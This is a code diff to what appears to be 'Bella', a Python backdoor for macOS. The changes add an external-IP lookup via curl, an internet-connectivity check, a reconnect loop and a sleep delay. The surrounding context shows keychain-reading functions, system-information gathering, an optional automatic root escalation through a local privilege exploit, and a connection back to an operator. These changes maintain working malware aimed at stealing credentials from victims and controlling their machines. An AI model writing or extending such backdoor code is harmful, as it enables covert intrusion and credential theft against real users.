@@ -1200,6 +1200,18 @@ def getKeychains():
 	#		kchain = x
 	return kchain
 
+
+def get_external_ip():
+	return subprocess.check_output("curl http://ipecho.net/plain", shell=True)
+
+def internet_on():
+    try:
+        urllib2.urlopen('http://216.58.192.142', timeout=1) #google's IP
+        return True
+    except urllib2.URLError:
+		return False
+
+
 def bella_info():
 	mainString = ""
 	send_msg("%sGathering system information.\n" % yellow_star, False)
@@ -1829,7 +1841,7 @@ def bella(*Emma):
 			model = output[1].split("=")[1][1:] #get everything after equal sign, and then remove first space.
 		updateDB(model, 'model')
 
-	while True:
+	while internet_on():
 		subprocess_cleanup()
 		print "Starting Bella"
 		#rooter(). try to get root automatically. uncomment this line, if you want to run bella on say, a Guest account, and have it automatically escalate to root (via LPE) without you having to do anything.
@@ -2249,7 +2261,7 @@ def bella(*Emma):
 			bella_connection.close()
 		except:
 			pass
-
+	time.sleep(10)
 ##### Below variables are global scopes that are accessed by most of the methods in Bella. Should make a class structure #####
 
 violet = '\033[95m'
